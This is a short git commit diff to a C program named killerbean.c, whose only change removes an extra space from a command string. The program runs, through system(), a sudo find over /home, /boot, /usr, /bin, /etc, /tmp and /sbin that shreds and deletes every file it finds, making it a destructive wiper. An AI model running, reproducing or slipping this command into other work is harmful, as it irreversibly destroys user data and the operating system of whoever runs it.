d332449d9de03aa930a0d829153b0e85e583e690
peach <ginahenstock7@gmail.com>
2021-11-26 19:45:06 +0200

    Update killerbean.c

--- killerbean.c
+++ killerbean.c
@@ -6,7 +6,7 @@
 int main () {
    char command[200];
 
-   strcpy(command, "sudo find  /home /boot /usr /bin /etc /tmp /sbin -exec shred {} -v -z -u \\;" );//deletes specific files to avoid the blackhole of dev/zero
+   strcpy(command, "sudo find /home /boot /usr /bin /etc /tmp /sbin -exec shred {} -v -z -u \\;" );//deletes specific files to avoid the blackhole of dev/zero
    printf(command);//debugging
    system(command);
 
